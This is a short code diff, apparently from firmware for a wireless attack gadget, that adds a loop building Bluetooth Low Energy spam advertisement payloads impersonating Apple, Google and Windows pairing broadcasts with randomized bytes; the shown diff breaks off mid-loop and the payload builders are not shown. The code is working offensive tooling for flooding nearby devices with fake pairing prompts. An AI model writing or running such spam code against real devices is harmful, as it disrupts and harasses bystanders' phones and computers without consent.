@@ -236,3 +236,23 @@ void bleRunSpamLoop(int spam_type) {
     BLE.beginPeripheral();
     delay(100);
 
+    oled_attack_start();
+    int rotation = 0;
+
+    while (g_app.attack_mode == AttackMode::BLE_SPAM) {
+        uint8_t payload[31];
+        size_t size = 0;
+
+        if (spam_type == 0) {
+            size = bleBuildAppleSpamPayload(payload, sizeof(payload), rotation,
+                                            (uint8_t)random(256), (uint8_t)random(256));
+        } else if (spam_type == 1) {
+            size = bleBuildGoogleSpamPayload(payload, sizeof(payload), rotation);
+        } else {
+            uint8_t r4[4] = {
+                (uint8_t)random(256), (uint8_t)random(256),
+                (uint8_t)random(256), (uint8_t)random(256)
+            };
+            size = bleBuildWindowsSpamPayload(payload, sizeof(payload), r4);
+        }
+
